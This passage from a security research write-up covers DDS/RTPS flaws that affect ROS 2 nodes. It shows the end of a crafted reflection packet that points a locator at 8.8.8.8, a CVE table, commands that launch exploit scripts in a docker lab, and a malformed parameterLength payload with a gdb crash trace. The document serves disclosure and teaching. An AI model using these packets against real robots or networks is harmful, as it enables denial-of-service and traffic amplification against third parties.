    <span id="cb22-85"><a href="#cb22-85" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">4</span>,</span>
    <span id="cb22-86"><a href="#cb22-86" aria-hidden="true" tabindex="-1"></a>                                parameterData<span class="op">=</span><span class="st">b&quot;?</span><span class="ch">\xfc\x00\x00</span><span class="st">&quot;</span>,</span>
    <span id="cb22-87"><a href="#cb22-87" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-88"><a href="#cb22-88" aria-hidden="true" tabindex="-1"></a>                            PID_METATRAFFIC_UNICAST_LOCATOR(</span>
    <span id="cb22-89"><a href="#cb22-89" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">50</span>,</span>
    <span id="cb22-90"><a href="#cb22-90" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">24</span>,</span>
    <span id="cb22-91"><a href="#cb22-91" aria-hidden="true" tabindex="-1"></a>                                locator<span class="op">=</span>LocatorPacket(</span>
    <span id="cb22-92"><a href="#cb22-92" aria-hidden="true" tabindex="-1"></a>                                    locatorKind<span class="op">=</span><span class="dv">16777216</span>, port<span class="op">=</span><span class="dv">47324</span>, address<span class="op">=</span><span class="st">&quot;8.8.8.8&quot;</span></span>
    <span id="cb22-93"><a href="#cb22-93" aria-hidden="true" tabindex="-1"></a>                                ),</span>
    <span id="cb22-94"><a href="#cb22-94" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-95"><a href="#cb22-95" aria-hidden="true" tabindex="-1"></a>                            PID_METATRAFFIC_MULTICAST_LOCATOR(</span>
    <span id="cb22-96"><a href="#cb22-96" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">51</span>,</span>
    <span id="cb22-97"><a href="#cb22-97" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">24</span>,</span>
    <span id="cb22-98"><a href="#cb22-98" aria-hidden="true" tabindex="-1"></a>                                locator<span class="op">=</span>LocatorPacket(</span>
    <span id="cb22-99"><a href="#cb22-99" aria-hidden="true" tabindex="-1"></a>                                    locatorKind<span class="op">=</span><span class="dv">16777216</span>,</span>
    <span id="cb22-100"><a href="#cb22-100" aria-hidden="true" tabindex="-1"></a>                                    port<span class="op">=</span><span class="dv">17902</span>,</span>
    <span id="cb22-101"><a href="#cb22-101" aria-hidden="true" tabindex="-1"></a>                                    address<span class="op">=</span><span class="st">&quot;239.255.0.1&quot;</span>,</span>
    <span id="cb22-102"><a href="#cb22-102" aria-hidden="true" tabindex="-1"></a>                                ),</span>
    <span id="cb22-103"><a href="#cb22-103" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-104"><a href="#cb22-104" aria-hidden="true" tabindex="-1"></a>                            PID_DEFAULT_UNICAST_LOCATOR(</span>
    <span id="cb22-105"><a href="#cb22-105" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">49</span>,</span>
    <span id="cb22-106"><a href="#cb22-106" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">24</span>,</span>
    <span id="cb22-107"><a href="#cb22-107" aria-hidden="true" tabindex="-1"></a>                                locator<span class="op">=</span>LocatorPacket(</span>
    <span id="cb22-108"><a href="#cb22-108" aria-hidden="true" tabindex="-1"></a>                                    locatorKind<span class="op">=</span><span class="dv">16777216</span>,</span>
    <span id="cb22-109"><a href="#cb22-109" aria-hidden="true" tabindex="-1"></a>                                    port<span class="op">=</span><span class="dv">12345</span>,</span>
    <span id="cb22-110"><a href="#cb22-110" aria-hidden="true" tabindex="-1"></a>                                    address<span class="op">=</span><span class="st">&quot;127.0.0.1&quot;</span>,</span>
    <span id="cb22-111"><a href="#cb22-111" aria-hidden="true" tabindex="-1"></a>                                ),</span>
    <span id="cb22-112"><a href="#cb22-112" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-113"><a href="#cb22-113" aria-hidden="true" tabindex="-1"></a>                            PID_DEFAULT_MULTICAST_LOCATOR(</span>
    <span id="cb22-114"><a href="#cb22-114" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">72</span>,</span>
    <span id="cb22-115"><a href="#cb22-115" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">24</span>,</span>
    <span id="cb22-116"><a href="#cb22-116" aria-hidden="true" tabindex="-1"></a>                                locator<span class="op">=</span>LocatorPacket(</span>
    <span id="cb22-117"><a href="#cb22-117" aria-hidden="true" tabindex="-1"></a>                                    locatorKind<span class="op">=</span><span class="dv">16777216</span>,</span>
    <span id="cb22-118"><a href="#cb22-118" aria-hidden="true" tabindex="-1"></a>                                    port<span class="op">=</span><span class="dv">12345</span>,</span>
    <span id="cb22-119"><a href="#cb22-119" aria-hidden="true" tabindex="-1"></a>                                    address<span class="op">=</span><span class="st">&quot;127.0.0.1&quot;</span>,</span>
    <span id="cb22-120"><a href="#cb22-120" aria-hidden="true" tabindex="-1"></a>                                ),</span>
    <span id="cb22-121"><a href="#cb22-121" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-122"><a href="#cb22-122" aria-hidden="true" tabindex="-1"></a>                            PID_PARTICIPANT_MANUAL_LIVELINESS_COUNT(</span>
    <span id="cb22-123"><a href="#cb22-123" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">52</span>,</span>
    <span id="cb22-124"><a href="#cb22-124" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">4</span>,</span>
    <span id="cb22-125"><a href="#cb22-125" aria-hidden="true" tabindex="-1"></a>                                parameterData<span class="op">=</span><span class="st">b&quot;</span><span class="ch">\x00\x00\x00\x00</span><span class="st">&quot;</span>,</span>
    <span id="cb22-126"><a href="#cb22-126" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-127"><a href="#cb22-127" aria-hidden="true" tabindex="-1"></a>                            PID_UNKNOWN(</span>
    <span id="cb22-128"><a href="#cb22-128" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">45061</span>,</span>
    <span id="cb22-129"><a href="#cb22-129" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">4</span>,</span>
    <span id="cb22-130"><a href="#cb22-130" aria-hidden="true" tabindex="-1"></a>                                parameterData<span class="op">=</span><span class="st">b&quot;</span><span class="ch">\x03\x00\x00\x00</span><span class="st">&quot;</span>,</span>
    <span id="cb22-131"><a href="#cb22-131" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-132"><a href="#cb22-132" aria-hidden="true" tabindex="-1"></a>                            PID_PARTICIPANT_LEASE_DURATION(</span>
    <span id="cb22-133"><a href="#cb22-133" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">2</span>,</span>
    <span id="cb22-134"><a href="#cb22-134" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">8</span>,</span>
    <span id="cb22-135"><a href="#cb22-135" aria-hidden="true" tabindex="-1"></a>                                parameterData<span class="op">=</span><span class="st">b&quot;,</span><span class="ch">\x01\x00\x00\x00\x00\x00\x00</span><span class="st">&quot;</span>,</span>
    <span id="cb22-136"><a href="#cb22-136" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-137"><a href="#cb22-137" aria-hidden="true" tabindex="-1"></a>                        ],</span>
    <span id="cb22-138"><a href="#cb22-138" aria-hidden="true" tabindex="-1"></a>                        sentinel<span class="op">=</span>PID_SENTINEL(parameterId<span class="op">=</span><span class="dv">1</span>, parameterLength<span class="op">=</span><span class="dv">0</span>),</span>
    <span id="cb22-139"><a href="#cb22-139" aria-hidden="true" tabindex="-1"></a>                    ),</span>
    <span id="cb22-140"><a href="#cb22-140" aria-hidden="true" tabindex="-1"></a>                ),</span>
    <span id="cb22-141"><a href="#cb22-141" aria-hidden="true" tabindex="-1"></a>            )</span>
    <span id="cb22-142"><a href="#cb22-142" aria-hidden="true" tabindex="-1"></a>        ]</span>
    <span id="cb22-143"><a href="#cb22-143" aria-hidden="true" tabindex="-1"></a>    )</span>
    <span id="cb22-144"><a href="#cb22-144" aria-hidden="true" tabindex="-1"></a>)</span>
    <span id="cb22-145"><a href="#cb22-145" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb22-146"><a href="#cb22-146" aria-hidden="true" tabindex="-1"></a>send(package)</span></code></pre></div>
    <p>Fully avoiding this flaw requires a DDS implementation to break with the standard specification (which is not acceptable by various vendors because they profit from the interoperability the complying with the standard provides). Partial mitigations have appeared which implement exponential decay strategies for traffic amplification, making its exploitation more challenging.</p>
    <p>This security issue affected all <strong>DDS implementations</strong> and as a result, all ROS 2 Nodes that build on top of DDS. As part of this research, various CVE IDs were filed:</p>
    <table>
    <colgroup>
    <col style="width: 16%" />
    <col style="width: 26%" />
    <col style="width: 20%" />
    <col style="width: 20%" />
    <col style="width: 16%" />
    </colgroup>
    <thead>
    <tr class="header">
    <th>CVE ID</th>
    <th>Description</th>
    <th>Scope</th>
    <th>CVSS</th>
    <th>Notes</th>
    </tr>
    </thead>
    <tbody>
    <tr class="odd">
    <td>CVE-2021-38487</td>
    <td>RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions 3.0.0 and later are vulnerable when an attacker sends a specially crafted packet to flood victims’ devices with unwanted traffic, which may result in a denial-of-service condition.</td>
    <td>ConnextDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:L/AR:H">8.6</a></td>
    <td><a href="https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071">Mitigation patch in &gt;= 6.1.0</a></td>
    </tr>
    <tr class="even">
    <td>CVE-2021-38429</td>
    <td>OCI OpenDDS versions prior to 3.18.1 are vulnerable when an attacker sends a specially crafted packet to flood victims’ devices with unwanted traffic, which may result in a denial-of-service condition.</td>
    <td>OpenDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:L/AR:H">8.6</a></td>
    <td><a href="https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1">Mitigation patch in &gt;= 3.18.1</a></td>
    </tr>
    <tr class="odd">
    <td>CVE-2021-38425</td>
    <td>eProsima Fast-DDS versions prior to 2.4.0 (#2269) are susceptible to exploitation when an attacker sends a specially crafted packet to flood a target device with unwanted traffic, which may result in a denial-of-service condition.</td>
    <td>eProsima Fast-DDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:T/RC:C/CR:L/AR:H">8.6</a></td>
    <td><a href="https://github.com/eProsima/Fast-DDS/issues/2267">WIP mitigation in master</a></td>
    </tr>
    </tbody>
    </table>
    <h4 id="trying-it-out">Trying it out:</h4>
    <p>Let’s try this out in the dockerized environment using byobu to facilitate the setup:</p>
    <div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="co">## terminal 1 - ROS 2 Node</span></span>
    <span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Launch container</span></span>
    <span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> hacking_ros2:foxy /bin/bash</span>
    <span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="co"># (inside of the container), launch configuration</span></span>
    <span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a><span class="ex">byobu</span> <span class="at">-f</span> configs/ros2_reflection.conf attach</span>
    <span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a><span class="co">## terminal 1 - attacker</span></span>
    <span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Launch the exploit</span></span>
    <span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python3 exploits/reflection.py <span class="dv">2</span><span class="op">&gt;</span> /dev/null</span></code></pre></div>
    <h3 id="ros-2-node-crashing">ROS 2 Node crashing</h3>
    <p>Fuzz testing often helps find funny flaws due to programming errors in the corresponding implementations. The following two were found while doing fuzz testing in a white-boxed manner (with access to the source code):</p>
    <table>
    <colgroup>
    <col style="width: 16%" />
    <col style="width: 26%" />
    <col style="width: 20%" />
    <col style="width: 20%" />
    <col style="width: 16%" />
    </colgroup>
    <thead>
    <tr class="header">
    <th>CVE ID</th>
    <th>Description</th>
    <th>Scope</th>
    <th>CVSS</th>
    <th>Notes</th>
    </tr>
    </thead>
    <tbody>
    <tr class="odd">
    <td>CVE-2021-38447</td>
    <td>OCI OpenDDS versions prior to 3.18.1 are vulnerable when an attacker sends a specially crafted packet to flood target devices with unwanted traffic, which may result in a denial-of-service condition.</td>
    <td>OpenDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H">8.6</a></td>
    <td>Resource exhaustion <a href="https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1">&gt;= 3.18.1</a></td>
    </tr>
    <tr class="even">
    <td>CVE-2021-38445</td>
    <td>OCI OpenDDS versions prior to 3.18.1 do not handle a length parameter consistent with the actual length of the associated data, which may allow an attacker to remotely execute arbitrary code.</td>
    <td>OpenDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H">7.0</a></td>
    <td>Failed assertion <a href="https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1">&gt;= 3.18.1</a></td>
    </tr>
    </tbody>
    </table>
    <p>They both affected OpenDDS. Let’s try out <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-38445">CVE-2021-38445</a> which leads ROS 2 Nodes to either crash or execute arbitrary code due to DDS not handling properly the length of the <code>PID_BUILTIN_ENDPOINT_QOS</code> parameter within RTPS’s <code>RTPSSubMessage_DATA</code> submessage. We’ll reproduce this in the dockerized environment using byobu to facilitate the setup:</p>
    <div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="co">## terminal 1 - ROS 2 Node</span></span>
    <span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Launch container</span></span>
    <span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> hacking_ros2:foxy <span class="at">-c</span> <span class="st">&quot;byobu -f configs/ros2_crash.conf attach&quot;</span></span>
    <span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="co"># docker run -it --privileged --net=host hacking_ros2:foxy -c &quot;byobu -f configs/ros2_crash.conf attach&quot;</span></span>
    <span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a><span class="co">## terminal 2 - attacker</span></span>
    <span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Launch the exploit</span></span>
    <span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python3 exploits/crash.py <span class="dv">2</span><span class="op">&gt;</span> /dev/null</span></code></pre></div>
    <p><a href="https://asciinema.org/a/450474"><img src="https://asciinema.org/a/450474.svg" alt="ROS 2 Node crashing" /></a></p>
    <p>The key aspect in here is the <code>parameterLength</code> value:</p>
    <p><img src="../../images/2021/ros2_crasher.png" /></p>
    <figure>
    <embed src="images/2021/ros2_crasher.pdf" /><figcaption aria-hidden="true">An RTPS package with an incorrect parameterLength</figcaption>
    </figure>
    <div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">PID_BUILTIN_ENDPOINT_QOS</span><span class="er">(</span></span>
    <span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a>                  <span class="va">parameterId</span><span class="op">=</span>119,</span>
    <span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>                  <span class="va">parameterLength</span><span class="op">=</span>0,</span>
    <span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>                  <span class="va">parameterData</span><span class="op">=</span>b<span class="st">&quot;\x00\x00\x00\x00&quot;</span>,</span>
    <span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a>              <span class="kw">)</span><span class="ex">,</span></span></code></pre></div>
    <h4 id="looking-deeper-into-the-crash-issue">Looking deeper into the crash issue</h4>
    <p>This flaw was fixed in <a href="https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1">OpenDDS &gt;3.18.1</a> but if you wish to look deeper into it, debug the node, find the crash and further inspect the source code. Here’re are a few tips to do so:</p>
    <div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="co">## terminal 1 - ROS 2 Node</span></span>
    <span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="co"># rebuild workspace with debug symbols</span></span>
    <span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> build <span class="at">--merge-install</span> <span class="at">--packages-up-to</span> examples_rclcpp_minimal_publisher <span class="at">--cmake-args</span> <span class="at">-DCMAKE_BUILD_TYPE</span><span class="op">=</span>Debug</span></code></pre></div>
    <p>and then debug the node with <code>gdb</code>:</p>
    <div class="sourceCode" id="cb27"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="co">## terminal 1 - ROS 2 Node</span></span>
    <span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-get</span> install gdb  <span class="co"># install gdb</span></span>
    <span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> <span class="at">-P</span> ~ https://git.io/.gdbinit  <span class="co"># get a comfortable debugging environment</span></span>
    <span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="bu">source</span> /opt/opendds_ws/install/setup.bash</span>
    <span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">RMW_IMPLEMENTATION</span><span class="op">=</span>rmw_opendds_cpp</span>
    <span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a><span class="co"># launch debugging session with OpenDDS</span></span>
    <span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a><span class="fu">gdb</span> /opt/opendds_ws/install/lib/examples_rclcpp_minimal_publisher/publisher_lambda</span></code></pre></div>
    <p>if done properly, this should lead you to the following:</p>
    <div class="sourceCode" id="cb28"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">───</span> Assembly ─────────────────────────────────────────────────────────────────────────────────────</span>
    <span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x00007f2c8479517a</span>  __GI_raise+186 xor    %edx,%edx</span>
    <span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x00007f2c8479517c</span>  __GI_raise+188 mov    %r9,%rsi</span>
    <span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x00007f2c8479517f</span>  __GI_raise+191 mov    <span class="va">$0</span>x2,%edi</span>
    <span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x00007f2c84795184</span>  __GI_raise+196 mov    <span class="va">$0</span>xe,%eax</span>
    <span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x00007f2c84795189</span>  __GI_raise+201 syscall</span>
    <span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x00007f2c8479518b</span>  __GI_raise+203 mov    0x108<span class="er">(</span><span class="ex">%rsp</span><span class="kw">)</span><span class="ex">,%rax</span></span>
    <span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x00007f2c84795193</span>  __GI_raise+211 xor    %fs:0x28,%rax</span>
    <span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x00007f2c8479519c</span>  __GI_raise+220 jne    0x7f2c847951c4 <span class="op">&lt;</span>__GI_raise+260<span class="op">&gt;</span></span>
    <span id="cb28-10"><a href="#cb28-10" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x00007f2c8479519e</span>  __GI_raise+222 mov    %r8d,%eax</span>
    <span id="cb28-11"><a href="#cb28-11" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x00007f2c847951a1</span>  __GI_raise+225 add    <span class="va">$0</span>x118,%rsp</span>
    <span id="cb28-12"><a href="#cb28-12" aria-hidden="true" tabindex="-1"></a><span class="ex">───</span> Breakpoints ──────────────────────────────────────────────────────────────────────────────────</span>
    <span id="cb28-13"><a href="#cb28-13" aria-hidden="true" tabindex="-1"></a><span class="ex">───</span> Expressions ──────────────────────────────────────────────────────────────────────────────────</span>
    <span id="cb28-14"><a href="#cb28-14" aria-hidden="true" tabindex="-1"></a><span class="ex">───</span> History ──────────────────────────────────────────────────────────────────────────────────────</span>
    <span id="cb28-15"><a href="#cb28-15" aria-hidden="true" tabindex="-1"></a><span class="ex">───</span> Memory ───────────────────────────────────────────────────────────────────────────────────────</span>
    <span id="cb28-16"><a href="#cb28-16" aria-hidden="true" tabindex="-1"></a><span class="ex">───</span> Registers ────────────────────────────────────────────────────────────────────────────────────</span>
    <span id="cb28-17"><a href="#cb28-17" aria-hidden="true" tabindex="-1"></a>       <span class="ex">rax</span> 0x0000000000000000        rbx 0x00007f2c81b49700          rcx 0x00007f2c8479518b</span>
    <span id="cb28-18"><a href="#cb28-18" aria-hidden="true" tabindex="-1"></a>       <span class="ex">rdx</span> 0x0000000000000000        rsi 0x00007f2c81b479d0          rdi 0x0000000000000002</span>
    <span id="cb28-19"><a href="#cb28-19" aria-hidden="true" tabindex="-1"></a>       <span class="ex">rbp</span> 0x00007f2c8490a588        rsp 0x00007f2c81b479d0           r8 0x0000000000000000</span>
    <span id="cb28-20"><a href="#cb28-20" aria-hidden="true" tabindex="-1"></a>        <span class="ex">r9</span> 0x00007f2c81b479d0        r10 0x0000000000000008          r11 0x0000000000000246</span>
    <span id="cb28-21"><a href="#cb28-21" aria-hidden="true" tabindex="-1"></a>       <span class="ex">r12</span> 0x00007f2c83af1e00        r13 0x0000000000000176          r14 0x00007f2c83af21c4</span>
    <span id="cb28-22"><a href="#cb28-22" aria-hidden="true" tabindex="-1"></a>       <span class="ex">r15</span> 0x0000000000000000        rip 0x00007f2c8479518b       eflags [ PF ZF IF ]</span>
    <span id="cb28-23"><a href="#cb28-23" aria-hidden="true" tabindex="-1"></a>        <span class="ex">cs</span> 0x00000033                 ss 0x0000002b                   ds 0x00000000</span>
    <span id="cb28-24"><a href="#cb28-24" aria-hidden="true" tabindex="-1"></a>        <span class="ex">es</span> 0x00000000                 fs 0x00000000                   gs 0x00000000</span>
    <span id="cb28-25"><a href="#cb28-25" aria-hidden="true" tabindex="-1"></a><span class="ex">───</span> Source ───────────────────────────────────────────────────────────────────────────────────────</span>
    <span id="cb28-26"><a href="#cb28-26" aria-hidden="true" tabindex="-1"></a><span class="ex">Cannot</span> display <span class="st">&quot;raise.c&quot;</span></span>
    <span id="cb28-27"><a href="#cb28-27" aria-hidden="true" tabindex="-1"></a><span class="ex">───</span> Stack ────────────────────────────────────────────────────────────────────────────────────────</span>
    <span id="cb28-28"><a href="#cb28-28" aria-hidden="true" tabindex="-1"></a><span class="ex">[0]</span> from 0x00007f2c8479518b in __GI_raise+203 at ../sysdeps/unix/sysv/linux/raise.c:50</span>
    <span id="cb28-29"><a href="#cb28-29" aria-hidden="true" tabindex="-1"></a><span class="ex">[1]</span> from 0x00007f2c84774859 in __GI_abort+299 at abort.c:79</span>
    <span id="cb28-30"><a href="#cb28-30" aria-hidden="true" tabindex="-1"></a><span class="ex">[2]</span> from 0x00007f2c84774729 in __assert_fail_base+-71239 at assert.c:92</span>
    <span id="cb28-31"><a href="#cb28-31" aria-hidden="true" tabindex="-1"></a><span class="ex">[3]</span> from 0x00007f2c84785f36 in __GI___assert_fail+70 at assert.c:101</span>
    <span id="cb28-32"><a href="#cb28-32" aria-hidden="true" tabindex="-1"></a><span class="ex">[4]</span> from 0x00007f2c836bbc38 in OpenDDS::DCPS::Serializer::smemcpy<span class="er">(</span><span class="ex">char*,</span> char const<span class="pp">*</span>, unsigned long<span class="kw">)</span><span class="ex">+66</span> at /opt/OpenDDS/dds/DCPS/Serializer.cpp:374</span>
    <span id="cb28-33"><a href="#cb28-33" aria-hidden="true" tabindex="-1"></a><span class="ex">[5]</span> from 0x00007f2c81cc51ba in OpenDDS::DCPS::Serializer::doread<span class="er">(</span><span class="ex">char*,</span> unsigned long, bool, unsigned long<span class="kw">)</span><span class="ex">+250</span> at ../../../../dds/DCPS/Serializer.inl:243</span>
    <span id="cb28-34"><a href="#cb28-34" aria-hidden="true" tabindex="-1"></a><span class="ex">[6]</span> from 0x00007f2c81cc52a0 in OpenDDS::DCPS::Serializer::buffer_read<span class="er">(</span><span class="ex">char*,</span> unsigned long, bool<span class="kw">)</span><span class="ex">+78</span> at ../../../../dds/DCPS/Serializer.inl:296</span>
    <span id="cb28-35"><a href="#cb28-35" aria-hidden="true" tabindex="-1"></a><span class="ex">[7]</span> from 0x00007f2c81cc5537 in OpenDDS::DCPS::operator<span class="op">&gt;&gt;</span><span class="er">(</span><span class="ex">OpenDDS::DCPS::Serializer</span><span class="kw">&amp;</span><span class="ex">,</span> unsigned int<span class="kw">&amp;)</span><span class="ex">+89</span> at ../../../../dds/DCPS/Serializer.inl:1193</span>
    <span id="cb28-36"><a href="#cb28-36" aria-hidden="true" tabindex="-1"></a><span class="ex">[8]</span> from 0x00007f2c83f78bf8 in OpenDDS::DCPS::operator<span class="op">&gt;&gt;</span><span class="er">(</span><span class="ex">OpenDDS::DCPS::Serializer</span><span class="kw">&amp;</span><span class="ex">,</span> OpenDDS::RTPS::Parameter<span class="kw">&amp;)</span><span class="ex">+7538</span> at /opt/OpenDDS/dds/DCPS/RTPS/RtpsCoreTypeSupportImpl.cpp:13064</span>
    <span id="cb28-37"><a href="#cb28-37" aria-hidden="true" tabindex="-1"></a><span class="ex">[9]</span> from 0x00007f2c83f6f2e6 in OpenDDS::DCPS::operator<span class="op">&gt;&gt;</span><span class="er">(</span><span class="ex">OpenDDS::DCPS::Serializer</span><span class="kw">&amp;</span><span class="ex">,</span> OpenDDS::RTPS::ParameterList<span class="kw">&amp;)</span><span class="ex">+102</span> at /opt/OpenDDS/dds/DCPS/RTPS/RtpsCoreTypeSupportImpl.cpp:9890</span>
    <span id="cb28-38"><a href="#cb28-38" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span></span>
    <span id="cb28-39"><a href="#cb28-39" aria-hidden="true" tabindex="-1"></a><span class="ex">───</span> Threads ──────────────────────────────────────────────────────────────────────────────────────</span>
    <span id="cb28-40"><a href="#cb28-40" aria-hidden="true" tabindex="-1"></a><span class="ex">[7]</span> id 16227 name publisher_lambd from 0x00007f2c8473c376 in futex_wait_cancelable+29 at ../sysdeps/nptl/futex-internal.h:183</span>
    <span id="cb28-41"><a href="#cb28-41" aria-hidden="true" tabindex="-1"></a><span class="ex">[6]</span> id 16226 name publisher_lambd from 0x00007f2c8486712b in __GI___select+107 at ../sysdeps/unix/sysv/linux/select.c:41</span>
    <span id="cb28-42"><a href="#cb28-42" aria-hidden="true" tabindex="-1"></a><span class="ex">[5]</span> id 16215 name publisher_lambd from 0x00007f2c8473c376 in futex_wait_cancelable+29 at ../sysdeps/nptl/futex-internal.h:183</span>
    <span id="cb28-43"><a href="#cb28-43" aria-hidden="true" tabindex="-1"></a><span class="ex">[4]</span> id 16214 name publisher_lambd from 0x00007f2c8479518b in __GI_raise+203 at ../sysdeps/unix/sysv/linux/raise.c:50</span>
